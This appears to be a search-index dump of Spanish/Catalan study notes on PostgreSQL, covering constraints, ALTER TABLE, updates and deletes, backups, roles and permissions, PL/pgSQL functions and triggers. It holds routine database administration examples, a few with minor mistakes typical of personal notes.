SERIAL : cada vez que se a\u00f1ade un registro se incrementa en 1. FOREIGN KEY/REFERENCES : clave forania para asegurar integidad refencial. ON DELETE/ON UPDATE : que hacer si rompemos la integridad al borrar/modificar una fila de la tabla referenciada. RESTRICT : retorna un error i no deja hacer la operaci\u00f3n CASCADE : borra o modifica filas afectadas SET DEFAULT : pone el valor per defecto SET NULL : pone el valor NULL INHERITS : hereda toda la estructura de una tabla y a\u00f1ade campos nuevos. Primary Key Primary key es el campo irrepetible y obligatorio de la tabla. CREATE TABLE clientes ( num_clie smallint PRIMARY KEY , empresa character varying ( 20 ) NOT NULL , rep_clie smallint NOT NULL DEFAULT 108 , limite_credito numeric ( 8 , 2 ) ); -- en el caso de una prymary key doble CREATE TABLE productos ( id_fab character ( 3 ), id_producto character ( 5 ), descripcion character varying ( 20 ) NOT NULL , precio numeric ( 7 , 2 ) NOT NULL , existencias integer NOT NULL , PRIMARY KEY ( id_fab , id_producto ) ); Default Valor por defecto que se a\u00f1adira al campo si no se le asigna ninguno al a\u00f1adir una fila a la tabla. CREATE TABLE clientes ( num_clie smallint PRIMARY KEY , empresa character varying ( 20 ) NOT NULL , rep_clie smallint NOT NULL DEFAULT 108 , limite_credito numeric ( 8 , 2 ) ); Unique Por a\u00f1adir ejemplo. Check Condici\u00f3n que deve cumplir ese campo de la tabla, si la condicion no retorna true, no se podra modificar o crear esa fila. CREATE TABLE clientes ( num_clie smallint PRIMARY KEY , empresa character varying ( 20 ) NOT NULL , rep_clie smallint NOT NULL , limite_credito numeric ( 8 , 2 ), CHECK ( num_clie < 1000 ) ); Serial Cada vez que a\u00f1adimos una fila en la tabla autors serial sumara en 1 el campo autor. create table autors ( autor serial PRIMARY KEY , nom varchar ( 30 ) not null , nacionalitat varchar ( 30 ) ); Foreign key Clave foranea hace referencia a otra columna de una tabla, si el valor a introducir/modificar coincide con uno que exista en la columna indicada se podra crear/modificar ese campo. CREATE TABLE clientes ( num_clie smallint PRIMARY KEY , empresa character varying ( 20 ) NOT NULL , rep_clie smallint NOT NULL REFERENCES repventas ( num_empl ), limite_credito numeric ( 8 , 2 ) ); CREATE TABLE clientes ( num_clie smallint , empresa character varying ( 20 ) NOT NULL , rep_clie smallint NOT NULL , limite_credito numeric ( 8 , 2 ), PRIMARY KEY ( num_clie ), FOREIGN KEY ( rep_clie ) REFERENCES repventas ( num_empl ) ); On Delete, On Update Condiciones al modificar o eliminar ese valor. Restrict Evita el borrado al detectar una inconsistencia. En el siguiente ejemplo, si intetas borrar un repventas que tiene un cliente asignado te denegar\u00e1 la acci\u00f3n. CREATE TABLE clientes ( num_clie smallint , empresa character varying ( 20 ) NOT NULL , rep_clie smallint NOT NULL REFERENCES repventas ( num_empl ) ON DELETE RESTRICT , limite_credito numeric ( 8 , 2 ), PRIMARY KEY ( num_clie ) ); Cascade En este caso la accion de borrado/actualizado se generara en cascada. Imagina que cambio el num_empleado de un repventas, con cascade a cada cliente que tenga asignado ese repventas se le actualizara automaticamente el campo rep_clie. CREATE TABLE clientes ( num_clie smallint , empresa character varying ( 20 ) NOT NULL , rep_clie smallint NOT NULL REFERENCES repventas ( num_empl ) ON DELETE CASCADE , limite_credito numeric ( 8 , 2 ), PRIMARY KEY ( num_clie ) ); Set Default, null Si al actualizar/eliminar se rompe la integridad entre tablas se asigna el valor por defecto. En el siguiente ejemplo, si intento actualizar el rep_clie de un cliente y no existe en repventas(num_empl) se asignara el valor por defecto 105. CREATE TABLE clientes ( num_clie smallint , empresa character varying ( 20 ) NOT NULL , rep_clie smallint NOT NULL DEFAULT 105 REFERENCES repventas ( num_empl ) ON UPDATE SET DEFAULT , limite_credito numeric ( 8 , 2 ), PRIMARY KEY ( num_clie ) ); -- en este caso se asignaria el valor null CREATE TABLE clientes ( num_clie smallint , empresa character varying ( 20 ) NOT NULL , rep_clie smallint NOT NULL REFERENCES repventas ( num_empl ) ON UPDATE SET NULL , limite_credito numeric ( 8 , 2 ), PRIMARY KEY ( num_clie ) ); Inherits Creacion de una tabla partiendo de otra a\u00f1adiendo campos. Creo la tabla clientes_vip partiendo de clientes y a\u00f1ado el campo puntos. CREATE TABLE clientes_vip ( puntos integer ) INHERITS ( clientes ); Alter Table ALTER TABLE: modificar estructura de la base de dades Afegir camp: ALTER TABLE oficinas ADD direccion varchar ( 100 ); Modificar camp: ALTER TABLE oficinas ALTER direccion varchar ( 200 ); Esborrar camp: ALTER TABLE oficinas DROP direccion ; Afegir constraint: ALTER TABLE oficinas ADD CHECK ( ciudad <> 'Barcelona' ) alter table repventas add nombre set not null ; -- o amb nom ALTER TABLE oficinas ADD CONSTRAINT no_badalona CHECK ( ciudad <> 'Badalona' ) Backup pg_dump -h 192 .168.88.4 -U jorge training > training_bk.sql Exportar \\ copy ( select * from pacients ) to 'pacients.csv' with csv header Inportar \\ copy pacients_nous from 'nousclients.csv' delimiter ',' csv Permisos de usuario \\ du + -- ver roles \\ dp -- ver permisos Crear usuario y dar permisos de acceso CREATE USER jorge WITH PASSWORD 'jorge' ; GRANT CONNECT ON DATABASE lab_clinic TO jorge ; GRANT USAGE ON SCHEMA public TO jorge ; Definir grupos de acceso CREATE ROLE viewer ; GRANT SELECT ON ALL TABLES IN SCHEMA public TO viewer ; CREATE ROLE editor ; GRANT SELECT , INSERT , UPDATE ON ALL TABLES IN SCHEMA public TO editor ; CREATE ROLE admin ; GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO admin ; A\u00f1adir usuario a grupo GRANT viewer TO jorge ; Quitar grupo de usuario REVOKE viewer FROM jorge ; GRANT editor TO jorge ; Elejir privilegio por defecto ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT ON TABLES TO viewer ; ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT , INSERT , UPDATE ON TABLES TO editor ; ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT ALL PRIVILEGES ON TABLES TO admin ;","title":"Modificaci\u00f3n tablas"},{"location":"bases_datos/postgres/modificaciones/#modificacion-tablas","text":"A\u00f1adir filas Copiar tabla Update Actualizar filas Actualizar nombre de columna Cambiar codificaci\u00f3n de caracteres Delete Crear tablas CONSTRAINTS Primary Key Default Unique Check Serial Foreign key On Delete, On Update Restrict Cascade Set Default, null Inherits Alter Table","title":"Modificaci\u00f3n tablas"},{"location":"bases_datos/postgres/modificaciones/#anadir-filas","text":"copy oficinas ( oficina , ciudad , region , dir , objetivo , ventas ) FROM stdin ; -- cal entrar les dades separades per TAB. -- Cada ENTER \u00e9s un nou registre; -- Per acabar posar \\. COPY oficinas ( oficina , ciudad , region , dir , objetivo , ventas ) FROM stdin ; 22 Denver Oeste 108 300000 . 00 186042 . 00 11 New York Este 106 575000 . 00 692637 . 00 12 Chicago Este 104 800000 . 00 735042 . 00 13 Atlanta Este 105 350000 . 00 367911 . 00 21 Los Angeles Oeste 108 725000 . 00 835915 . 00 \\ . INSERT INTO \"TABLA\" VALUES ( '999999' , '2017-01-01' , '9999' , '106' , 'rei' , '2a44l' , '7' , '31500.00' ); INSERT INTO peliculas ( code , title , did , date_prod , kind ) VALUES ( 'B6717' , 'Tampopo' , 110 , '1985-02-10' , 'Comedy' ), ( 'HG120' , 'The Dinner Game' , 140 , DEFAULT , 'Comedy' );","title":"A\u00f1adir filas"},{"location":"bases_datos/postgres/modificaciones/#copiar-tabla","text":"Copiar tabla identica. create table copia_rep as select * from repventas ; Copiar los datos de una tabla en otra ( han de coincidir los tipos ). insert into tabla_existente ( select * from repventas );","title":"Copiar tabla"},{"location":"bases_datos/postgres/modificaciones/#update","text":"","title":"Update"},{"location":"bases_datos/postgres/modificaciones/#actualizar-filas","text":"Al actualizar una fila tenemos que ir con cuidado ya que tenemos que hacer un select que solo salgan las filasque quieres modificar, si no se renombrara toda la columna que se muestre. Set \u2192 se refiere a lo que quieres modificar where \u2192 Depende de este where para modificar 1 o m\u00e1s filas ya que el n\u00famero de filas que se muestran se modifica en el campo set indicado sintaxis update tabla set columna - a - modificar = resultado_nuevo where columna - que - filtro = fila_que_quieres_modificar ; update pedidos set clie = 9999 where num_pedido = 999999 ; update clientes set rep_clie = ( select num_empl from repventas where nombre = 'Mary Jones' ), limite_credito = 60000 where empresa = 'Acme Mfg.' ; Actualizar filtrando con join simple. update repventas dir set cuota = ( select min ( cuota ) from repventas where oficina_rep = dir . oficina_rep ) from oficinas of where dir . num_empl = of . dir and cuota > any ( select cuota from repventas rep where of . oficina = rep . oficina_rep ); Cuando tienes que fltrar con una join complicada es mejor aislarla en una tabla temporal. with t as ( select dir . num_empl as empl from repventas dir join oficinas of on ( dir . num_empl = of . dir ) where cuota > any ( select cuota from repventas rep where of . oficina = rep . oficina_rep ) ) update repventas set titulo = ( select min ( cuota ) from repventas where oficina_rep = dir . oficina_rep ) where num_empl in ( select empl from t );","title":"Actualizar filas"},{"location":"bases_datos/postgres/modificaciones/#actualizar-nombre-de-columna","text":"alter table mi - tabla rename column nombre - antiguo to nombre - nuevo ;","title":"Actualizar nombre de columna"},{"location":"bases_datos/postgres/modificaciones/#cambiar-codificacion-de-caracteres","text":"update pg_database set encoding = 6 where datname = 'TABLA' ; -- (utf-8) update pg_database set datcollate = 'es_ES.UTF-8' where datname = 'TABLA' ; update pg_database set datctype = 'es_ES.UTF-8' where datname = 'TABLA' ;","title":"Cambiar codificaci\u00f3n de caracteres"},{"location":"bases_datos/postgres/modificaciones/#delete","text":"-- borrar tabla drop table copia_clie ; -- borrar base de datos drop database training ; Al usar delete hay que acordarse siempre de poner el where , en caso contrario borraremos todos los datos de la tabla. -- borrar fila delete from copia_rep where num_empl = 104 ;","title":"Delete"},{"location":"bases_datos/postgres/modificaciones/#crear-tablas","text":"","title":"Crear tablas"},{"location":"bases_datos/postgres/modificaciones/#constraints","text":"Es poden posar a cada columna o al final de la creaci\u00f3 de la taula, mirar documentaci\u00f3 Postgresql. NOT NULL : En la columno no puede haber un valor null. PRIMARY KEY : clave primaria nopuede ser repetida en la misma columna ni haber null. DEFAULT : poner u valor por defecto. UNIQUE : cada valor a de ser unico en la columna, puede ser null tambi\u00e9n. CHECK : comprueba que los valores cumplan una condici\u00f3n. SERIAL : cada vez que se a\u00f1ade un registro se incrementa en 1. FOREIGN KEY/REFERENCES : clave forania para asegurar integidad refencial. ON DELETE/ON UPDATE : que hacer si rompemos la integridad al borrar/modificar una fila de la tabla referenciada. RESTRICT : retorna un error i no deja hacer la operaci\u00f3n CASCADE : borra o modifica filas afectadas SET DEFAULT : pone el valor per defecto SET NULL : pone el valor NULL INHERITS : hereda toda la estructura de una tabla y a\u00f1ade campos nuevos.","title":"CONSTRAINTS"},{"location":"bases_datos/postgres/modificaciones/#primary-key","text":"Primary key es el campo irrepetible y obligatorio de la tabla. CREATE TABLE clientes ( num_clie smallint PRIMARY KEY , empresa character varying ( 20 ) NOT NULL , rep_clie smallint NOT NULL DEFAULT 108 , limite_credito numeric ( 8 , 2 ) ); -- en el caso de una prymary key doble CREATE TABLE productos ( id_fab character ( 3 ), id_producto character ( 5 ), descripcion character varying ( 20 ) NOT NULL , precio numeric ( 7 , 2 ) NOT NULL , existencias integer NOT NULL , PRIMARY KEY ( id_fab , id_producto ) );","title":"Primary Key"},{"location":"bases_datos/postgres/modificaciones/#default","text":"Valor por defecto que se a\u00f1adira al campo si no se le asigna ninguno al a\u00f1adir una fila a la tabla. CREATE TABLE clientes ( num_clie smallint PRIMARY KEY , empresa character varying ( 20 ) NOT NULL , rep_clie smallint NOT NULL DEFAULT 108 , limite_credito numeric ( 8 , 2 ) );","title":"Default"},{"location":"bases_datos/postgres/modificaciones/#unique","text":"Por a\u00f1adir ejemplo.","title":"Unique"},{"location":"bases_datos/postgres/modificaciones/#check","text":"Condici\u00f3n que deve cumplir ese campo de la tabla, si la condicion no retorna true, no se podra modificar o crear esa fila. CREATE TABLE clientes ( num_clie smallint PRIMARY KEY , empresa character varying ( 20 ) NOT NULL , rep_clie smallint NOT NULL , limite_credito numeric ( 8 , 2 ), CHECK ( num_clie < 1000 ) );","title":"Check"},{"location":"bases_datos/postgres/modificaciones/#serial","text":"Cada vez que a\u00f1adimos una fila en la tabla autors serial sumara en 1 el campo autor. create table autors ( autor serial PRIMARY KEY , nom varchar ( 30 ) not null , nacionalitat varchar ( 30 ) );","title":"Serial"},{"location":"bases_datos/postgres/modificaciones/#foreign-key","text":"Clave foranea hace referencia a otra columna de una tabla, si el valor a introducir/modificar coincide con uno que exista en la columna indicada se podra crear/modificar ese campo. CREATE TABLE clientes ( num_clie smallint PRIMARY KEY , empresa character varying ( 20 ) NOT NULL , rep_clie smallint NOT NULL REFERENCES repventas ( num_empl ), limite_credito numeric ( 8 , 2 ) ); CREATE TABLE clientes ( num_clie smallint , empresa character varying ( 20 ) NOT NULL , rep_clie smallint NOT NULL , limite_credito numeric ( 8 , 2 ), PRIMARY KEY ( num_clie ), FOREIGN KEY ( rep_clie ) REFERENCES repventas ( num_empl ) );","title":"Foreign key"},{"location":"bases_datos/postgres/modificaciones/#on-delete-on-update","text":"Condiciones al modificar o eliminar ese valor.","title":"On Delete, On Update"},{"location":"bases_datos/postgres/modificaciones/#restrict","text":"Evita el borrado al detectar una inconsistencia. En el siguiente ejemplo, si intetas borrar un repventas que tiene un cliente asignado te denegar\u00e1 la acci\u00f3n. CREATE TABLE clientes ( num_clie smallint , empresa character varying ( 20 ) NOT NULL , rep_clie smallint NOT NULL REFERENCES repventas ( num_empl ) ON DELETE RESTRICT , limite_credito numeric ( 8 , 2 ), PRIMARY KEY ( num_clie ) );","title":"Restrict"},{"location":"bases_datos/postgres/modificaciones/#cascade","text":"En este caso la accion de borrado/actualizado se generara en cascada. Imagina que cambio el num_empleado de un repventas, con cascade a cada cliente que tenga asignado ese repventas se le actualizara automaticamente el campo rep_clie. CREATE TABLE clientes ( num_clie smallint , empresa character varying ( 20 ) NOT NULL , rep_clie smallint NOT NULL REFERENCES repventas ( num_empl ) ON DELETE CASCADE , limite_credito numeric ( 8 , 2 ), PRIMARY KEY ( num_clie ) );","title":"Cascade"},{"location":"bases_datos/postgres/modificaciones/#set-default-null","text":"Si al actualizar/eliminar se rompe la integridad entre tablas se asigna el valor por defecto. En el siguiente ejemplo, si intento actualizar el rep_clie de un cliente y no existe en repventas(num_empl) se asignara el valor por defecto 105. CREATE TABLE clientes ( num_clie smallint , empresa character varying ( 20 ) NOT NULL , rep_clie smallint NOT NULL DEFAULT 105 REFERENCES repventas ( num_empl ) ON UPDATE SET DEFAULT , limite_credito numeric ( 8 , 2 ), PRIMARY KEY ( num_clie ) ); -- en este caso se asignaria el valor null CREATE TABLE clientes ( num_clie smallint , empresa character varying ( 20 ) NOT NULL , rep_clie smallint NOT NULL REFERENCES repventas ( num_empl ) ON UPDATE SET NULL , limite_credito numeric ( 8 , 2 ), PRIMARY KEY ( num_clie ) );","title":"Set Default, null"},{"location":"bases_datos/postgres/modificaciones/#inherits","text":"Creacion de una tabla partiendo de otra a\u00f1adiendo campos. Creo la tabla clientes_vip partiendo de clientes y a\u00f1ado el campo puntos. CREATE TABLE clientes_vip ( puntos integer ) INHERITS ( clientes );","title":"Inherits"},{"location":"bases_datos/postgres/modificaciones/#alter-table","text":"ALTER TABLE: modificar estructura de la base de dades Afegir camp: ALTER TABLE oficinas ADD direccion varchar ( 100 ); Modificar camp: ALTER TABLE oficinas ALTER direccion varchar ( 200 ); Esborrar camp: ALTER TABLE oficinas DROP direccion ; Afegir constraint: ALTER TABLE oficinas ADD CHECK ( ciudad <> 'Barcelona' ) alter table repventas add nombre set not null ; -- o amb nom ALTER TABLE oficinas ADD CONSTRAINT no_badalona CHECK ( ciudad <> 'Badalona' )","title":"Alter Table"},{"location":"bases_datos/postgres/modificaciones/#backup","text":"pg_dump -h 192 .168.88.4 -U jorge training > training_bk.sql","title":"Backup"},{"location":"bases_datos/postgres/modificaciones/#exportar","text":"\\ copy ( select * from pacients ) to 'pacients.csv' with csv header","title":"Exportar"},{"location":"bases_datos/postgres/modificaciones/#inportar","text":"\\ copy pacients_nous from 'nousclients.csv' delimiter ',' csv","title":"Inportar"},{"location":"bases_datos/postgres/modificaciones/#permisos-de-usuario","text":"\\ du + -- ver roles \\ dp -- ver permisos Crear usuario y dar permisos de acceso CREATE USER jorge WITH PASSWORD 'jorge' ; GRANT CONNECT ON DATABASE lab_clinic TO jorge ; GRANT USAGE ON SCHEMA public TO jorge ; Definir grupos de acceso CREATE ROLE viewer ; GRANT SELECT ON ALL TABLES IN SCHEMA public TO viewer ; CREATE ROLE editor ; GRANT SELECT , INSERT , UPDATE ON ALL TABLES IN SCHEMA public TO editor ; CREATE ROLE admin ; GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO admin ; A\u00f1adir usuario a grupo GRANT viewer TO jorge ; Quitar grupo de usuario REVOKE viewer FROM jorge ; GRANT editor TO jorge ; Elejir privilegio por defecto ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT ON TABLES TO viewer ; ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT , INSERT , UPDATE ON TABLES TO editor ; ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT ALL PRIVILEGES ON TABLES TO admin ;","title":"Permisos de usuario"},{"location":"bases_datos/postgres/plpgsql/","text":"Plpgsql Funciones modificar valor Argumento default Condicionales Loop For While Retornar selects Return una columna Return varias columnas Borrar todas funciones user Funciones Para ver las funciones de usuario \\df Hay diferentes formas de manejar las funciones, pero tienes que tener en cuenta siempre. argumentos de entrada: que tipo son, en el ejemplo var1 y var2, numeric. valor de salida: returns es el tipo de argumento que devolver\u00e1 la funci\u00f3n. variable de funci\u00f3n: todas las variables de funciones que utilices se tienen que declarar. devolver resultado: return sin la \"s\" devuelve el valor de salida ( es importante que sea del mismo tipo especificado en returns ) create or replace FUNCTION restar ( var1 numeric , var2 numeric ) returns numeric as $$ DECLARE resultado numeric ; BEGIN resultado : = var1 - var2 ; return resultado ; END ; $$ LANGUAGE plpgsql ; seg\u00fan los valores de entrada o salida de la funci\u00f3n se manejan los returns de forma diferente. modificar valor recibe un argumento o varios y lo devuelve un valor modificado. create or replace FUNCTION restar ( var1 numeric , var2 numeric ) returns numeric as $$ BEGIN return var1 - var2 ; END ; $$ LANGUAGE plpgsql ; select restar ( cuota , ventas ) from repventas ; restar ------------ - 17911 . 00 - 92725 . 00 - 124050 . 00 - 24912 . 00 57406 . 00 - 5673 . 00 ... Argumento default Cuando es opcional poner un argumento, tenemos que indicar un valor por defecto al argumento. create or replace function mayoredad ( var int default NULL ) returns text ... Execute Execute permite ejecutar alguna opci\u00f3n, un buen uso de el es tener el codigo m\u00e1s visual y facil de leer, como en el siguente ejemplo. create or replace function consulta_clients_import () returns setof text as $$ declare buscaquery text : = 'select nombre from repventas' ; begin return query execute ( buscaquery ); end ; $$ language plpgsql ; Condicionales En ocasiones queremos hacer diferentes acciones seg\u00fan la variable introducida, para eso existe los condicionales if - elsif - else. create or replace function mayoredad ( var int default NULL ) returns text as $$ DECLARE edad text ; begin if var is null then edad : = 'dame una edad' ; return edad ; elsif var < 18 then edad : = 'menor' ; return edad ; else edad : = 'adulto' ; return edad ; end if ; end ; $$ language plpgsql ; CREATE OR REPLACE FUNCTION del_usuariobycod ( INT ) RETURNS BOOL AS $$ DECLARE codigo ALIAS FOR $ 1 ; BEGIN DELETE FROM usuarios WHERE codusuario = codigo ; IF FOUND THEN RETURN TRUE ; ELSE RETURN FALSE ; END IF ; END ; $$ LANGUAGE plpgsql ; Loop For En los bucles for hay que tener en cuenta: Que quieres devolver? y quando? Si quieres devolver una variable al acabar un for, no hay problema se hace la funcion de siempre. Si quieres devolver la variable mientras est\u00e1 en proceso cambia la cosa: returns tiene que ser setof return next en la variable de salida. FOR target IN query LOOP statements END LOOP ; create or replace function contador () returns setof int as $$ declare counter int ; begin for counter in 1 .. 5 loop return next counter ; end loop ; end ; $$ language plpgsql ; select contador (); contador --- 1 2 3 4 5 En el uso de querys en el for no tiene mucho misterio, es igual. Con el cambio que al declarar una variable como record y esta ser\u00e1 el argumento del bucle. create or replace function contador () returns setof int as $$ declare counter record ; begin for counter in select oficina from oficinas loop return next counter . oficina ; end loop ; end ; $$ language plpgsql ; Foreach El bucle FOREACH es muy parecido a un bucle FOR, pero en lugar de iterar a trav\u00e9s de las filas devueltas por una consulta SQL, itera a trav\u00e9s de los elementos de un valor de matriz. (En general, FOREACH est\u00e1 dise\u00f1ado para recorrer componentes de una expresi\u00f3n de valor compuesto; en el futuro se pueden agregar variantes para recorrer compuestos adem\u00e1s de matrices). La instrucci\u00f3n FOREACH para recorrer una matriz es: create or replace function resto_letra ( resto int ) returns varchar as $$ declare res varchar : = '' ; contador int : = 0 ; letra varchar ; a varchar [] : = array [ 'T' , 'R' , 'W' , 'A' , 'G' , 'M' , 'Y' , 'F' , 'P' , 'D' , 'X' , 'B' , 'N' , 'J' , 'Z' , 'S' , 'Q' , 'V' , 'H' , 'L' , 'C' , 'K' , 'E' ]; begin foreach letra in array a loop if contador = resto then res : = letra ; end if ; contador : = contador + 1 ; end loop ; return res ; end ; $$ language plpgsql ; While While es un bucle con condici\u00f3n de salida. create or replace function contador () returns setof int as $$ declare counter int : = 0 ; begin while counter <= 6 loop return next counter ; counter : = counter + 1 ; end loop ; end ; $$ language plpgsql ; Exceptions error codes create or replace FUNCTION in_pacient ( nom , cognom , dni ) returns text AS $$ BEGIN INSERT INTO pacients VALUES ( default , nom , cognoms , dni ); return 'datos introducidos correctamente' ; EXCEPTION WHEN unique_violation THEN return 'Clau unica duplicada' ; WHEN foreign_key_violation THEN return 'Clau foranea inexistent' ; END ; $$ LANGUAGE plpgsql ; Perform Una instrucci\u00f3n PERFORM establece FOUND verdadero si produce una o m\u00e1s filas, falso si no se produce ninguna fila. Ademas descarta el resultado ( es decir no lo muestra por pantalla ). ... perform dni from pacients where dni = fila . dni ; if found then ... ... Retornar selects Al tratar con selects en funciones hay que tener en cuenta, que tienes que especificar en return que devuelves una query, con: return query Return una columna Cuando devolvemos una columna de una query, hay que tener en cuenta de a\u00f1adir en returns el tipo setof que construye un conjunto con el resultado y lo muestra. create or replace FUNCTION maxdos_promig_anual ( anio int ) returns setof numeric as $$ begin return query select max ( promig_anual ( num_empl , anio )) from repventas ; end ; $$ language plpgsql ; select max_promig_anual ( 1990 ); max_promig_anual --- 11566 ( 1 fila ) Return varias columnas Si tenemos que devolver varias columnas de una tabla, primero tenemos que crear una tabla en returns. Especificar el tipo de campo en cada columna y estos han de coincidir en la query. CREATE OR REPLACE FUNCTION clientes_rep ( rep int ) RETURNS table ( cliente smallint , credito numeric ) as $$ begin return query select num_clie , limite_credito from clientes where rep_clie = rep ; end ; $$ LANGUAGE plpgsql ; select * from clientes_rep ( 103 ); cliente | credito ---------+---------- 2111 | 50000 . 00 2121 | 45000 . 00 2109 | 25000 . 00 ( 3 filas ) Exportar typo columna En ocasiones no sabemos que typo de columna tenemos que devolver, una forma f\u00e1cil es se\u00f1alar la tabla columna e indicarle que lo exporte directamente. ... returns table ( nom_empresa clientes . empresa % type , id_clie clientes . num_clie % type , nom_rep repventas . nombre % type ) ... Borrar todas funciones user select 'DROP FUNCTION ' || ns . nspname || '.' || proname || '(' || oidvectortypes ( proargtypes ) || ');' FROM pg_proc INNER JOIN pg_namespace ns ON ( pg_proc . pronamespace = ns . oid ) where ns . nspname = 'public' ; Variables especiales en PL/pgSQL Cuando una funci\u00f3n escrita en PL/pgSQL es llamada por un disparador tenemos ciertas variableS especiales disponibles en dicha funci\u00f3n. Estas variables son las siguientes: NEW Tipo de dato RECORD; Variable que contiene la nueva fila de la tabla para las operaciones INSERT/UPDATE en disparadores del tipo row-level. Esta variable es NULL en disparadores del tipo statement-level. OLD Tipo de dato RECORD; Variable que contiene la antigua fila de la tabla para las operaciones UPDATE/DELETE en disparadores del tipo row-level. Esta variable es NULL en disparadores del tipo statement-level. TG_NAME Tipo de dato name; variable que contiene el nombre del disparador que est\u00e1 usando la funci\u00f3n actualmente. TG_WHEN Tipo de dato text; una cadena de texto con el valor BEFORE o AFTER dependiendo de como el disparador que est\u00e1 usando la funci\u00f3n actualmente ha sido definido TG_LEVEL Tipo de dato text; una cadena de texto con el valor ROW o STATEMENT dependiendo de como el disparador que est\u00e1 usando la funci\u00f3n actualmente ha sido definido TG_OP Tipo de dato text; una cadena de texto con el valor INSERT, UPDATE o DELETE dependiendo de la operaci\u00f3n que ha activado el disparador que est\u00e1 usando la funci\u00f3n actualmente. TG_RELID Tipo de dato oid; el identificador de objeto de la tabla que ha activado el disparador que est\u00e1 usando la funci\u00f3n actualmente. TG_RELNAME Tipo de dato name; el nombre de la tabla que ha activado el disparador que est\u00e1 usando la funci\u00f3n actualmente. Esta variable es obsoleta y puede desaparacer en el futuro. Usar TG_TABLE_NAME. TG_TABLE_NAME Tipo de dato name; el nombre de la tabla que ha activado el disparador que est\u00e1 usando la funci\u00f3n actualmente. TG_TABLE_SCHEMA Tipo de dato name; el nombre de la schema de la tabla que ha activado el disparador que est\u00e1 usando la funci\u00f3n actualmente. TG_NARGS Tipo de dato integer; el n\u00famero de argumentos dados al procedimiento en la sentencia CREATE TRIGGER. TG_ARGV[] Tipo de dato text array; los argumentos de la sentencia CREATE TRIGGER. El \u00edndice empieza a contar desde 0. Indices inv\u00e1lidos (menores que 0 \u00f3 mayores/iguales que tg_nargs) resultan en valores nulos. Trigger Triger es una acci\u00f3n automatizada que se ejecuta antes o despues de hacer un insert, update o delete. Consiste en una funcion que se encarga de hacer la acci\u00f3n, y un disparador que se encarga de determinar en que momento ejecutarse. Caracteristicas de la funci\u00f3n: Tiene que crearse la funcion antes que elm disparador No tiene que tener argumentos y deve devolver siempre trigger El procedimiento STASTEMENT siempre tiene que devolver NULL Si una tabla tiene mas de un disparador definido, estos se ejecutaran por orden alfabetico. La fila retornada por cada disparador , se convierte en la entrada del siguiente. Se tiene que tener cuidado con no hacer bucles infinitos llamando a un disparador recursivamente. Una funcion de trigger FOR EACH ROW : S'executa per cada registre afectat per la sent\u00e8ncia SQL. Els exemples anteriors s\u00f3n row-level. FOR EACH STATEMENT : S'executa nom\u00e9s un cop, tant si la sent\u00e8cia SQL afecta nom\u00e9s a un registre com si n'afecta a m\u00e9s d'un. En els exemples anteriors el TRIGGER BEFORE DELETE afecta a varis registres, si hagu\u00e9s sigut statement-level nom\u00e9s s'hagu\u00e9s executat un cop la funci\u00f3. -- funcion create or replace function anadir_log() returns TRIGGER AS $$ BEGIN insert into registro_log values (current_user, TG_TABLE_NAME, TG_OP, current_timestamp); RETURN NULL; END; $$ language plpgsql; -- disparador create trigger anadir_log after insert or update or delete on resultats for each statement execute procedure anadir_log(); select array_position(array['p','o'],'p'); array_position 1","title":"Plpgsql"},{"location":"bases_datos/postgres/plpgsql/#plpgsql","text":"Funciones modificar valor Argumento default Condicionales Loop For While Retornar selects Return una columna Return varias columnas Borrar todas funciones user","title":"Plpgsql"},{"location":"bases_datos/postgres/plpgsql/#funciones","text":"Para ver las funciones de usuario \\df Hay diferentes formas de manejar las funciones, pero tienes que tener en cuenta siempre. argumentos de entrada: que tipo son, en el ejemplo var1 y var2, numeric. valor de salida: returns es el tipo de argumento que devolver\u00e1 la funci\u00f3n. variable de funci\u00f3n: todas las variables de funciones que utilices se tienen que declarar. devolver resultado: return sin la \"s\" devuelve el valor de salida ( es importante que sea del mismo tipo especificado en returns ) create or replace FUNCTION restar ( var1 numeric , var2 numeric ) returns numeric as $$ DECLARE resultado numeric ; BEGIN resultado : = var1 - var2 ; return resultado ; END ; $$ LANGUAGE plpgsql ; seg\u00fan los valores de entrada o salida de la funci\u00f3n se manejan los returns de forma diferente.","title":"Funciones"},{"location":"bases_datos/postgres/plpgsql/#modificar-valor","text":"recibe un argumento o varios y lo devuelve un valor modificado. create or replace FUNCTION restar ( var1 numeric , var2 numeric ) returns numeric as $$ BEGIN return var1 - var2 ; END ; $$ LANGUAGE plpgsql ; select restar ( cuota , ventas ) from repventas ; restar ------------ - 17911 . 00 - 92725 . 00 - 124050 . 00 - 24912 . 00 57406 . 00 - 5673 . 00 ...","title":"modificar valor"},{"location":"bases_datos/postgres/plpgsql/#argumento-default","text":"Cuando es opcional poner un argumento, tenemos que indicar un valor por defecto al argumento. create or replace function mayoredad ( var int default NULL ) returns text ...","title":"Argumento default"},{"location":"bases_datos/postgres/plpgsql/#execute","text":"Execute permite ejecutar alguna opci\u00f3n, un buen uso de el es tener el codigo m\u00e1s visual y facil de leer, como en el siguente ejemplo. create or replace function consulta_clients_import () returns setof text as $$ declare buscaquery text : = 'select nombre from repventas' ; begin return query execute ( buscaquery ); end ; $$ language plpgsql ;","title":"Execute"},{"location":"bases_datos/postgres/plpgsql/#condicionales","text":"En ocasiones queremos hacer diferentes acciones seg\u00fan la variable introducida, para eso existe los condicionales if - elsif - else. create or replace function mayoredad ( var int default NULL ) returns text as $$ DECLARE edad text ; begin if var is null then edad : = 'dame una edad' ; return edad ; elsif var < 18 then edad : = 'menor' ; return edad ; else edad : = 'adulto' ; return edad ; end if ; end ; $$ language plpgsql ; CREATE OR REPLACE FUNCTION del_usuariobycod ( INT ) RETURNS BOOL AS $$ DECLARE codigo ALIAS FOR $ 1 ; BEGIN DELETE FROM usuarios WHERE codusuario = codigo ; IF FOUND THEN RETURN TRUE ; ELSE RETURN FALSE ; END IF ; END ; $$ LANGUAGE plpgsql ;","title":"Condicionales"},{"location":"bases_datos/postgres/plpgsql/#loop","text":"","title":"Loop"},{"location":"bases_datos/postgres/plpgsql/#for","text":"En los bucles for hay que tener en cuenta: Que quieres devolver? y quando? Si quieres devolver una variable al acabar un for, no hay problema se hace la funcion de siempre. Si quieres devolver la variable mientras est\u00e1 en 